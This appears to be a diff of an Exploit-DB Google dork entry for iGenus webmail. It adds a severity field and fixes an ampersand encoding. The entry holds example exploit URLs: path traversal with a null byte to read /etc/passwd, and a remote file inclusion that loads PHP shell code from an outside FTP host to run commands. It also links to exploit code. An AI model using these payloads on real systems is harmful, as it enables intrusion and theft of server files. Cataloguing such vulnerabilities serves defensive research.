@@ -1,4 +1,5 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/1308
+Severity: 5 
 Category:         Advisories and Vulnerabilities
 Published Date:   2006-02-28
 Author:           anonymous
@@ -6,4 +7,4 @@ GoogleDork:       intitle:"igenus webmail login"
 Description:      intitle:"igenus webmail login"
 
 
-intitle:"igenus webmail login"example exploit: http://[target]/[path]/?Lang=../../../../../../../../../../etc/passwd%00 http://[target]/[path]/config/config_inc.php?SG_HOME=../../../../../../../../../../etc/passwd%00 also, on php5: http://[target]/[path]/config/config_inc.php?SG_HOME=ftp://username:password@somehost.com&amp;cmd=dir where on somehost.com you have a php shell code in a ".config" file exploit code: http://retrogod.altervista.org/igenus_202_xpl_pl.html
+intitle:"igenus webmail login"example exploit: http://[target]/[path]/?Lang=../../../../../../../../../../etc/passwd%00 http://[target]/[path]/config/config_inc.php?SG_HOME=../../../../../../../../../../etc/passwd%00 also, on php5: http://[target]/[path]/config/config_inc.php?SG_HOME=ftp://username:password@somehost.com&cmd=dir where on somehost.com you have a php shell code in a ".config" file exploit code: http://retrogod.altervista.org/igenus_202_xpl_pl.html
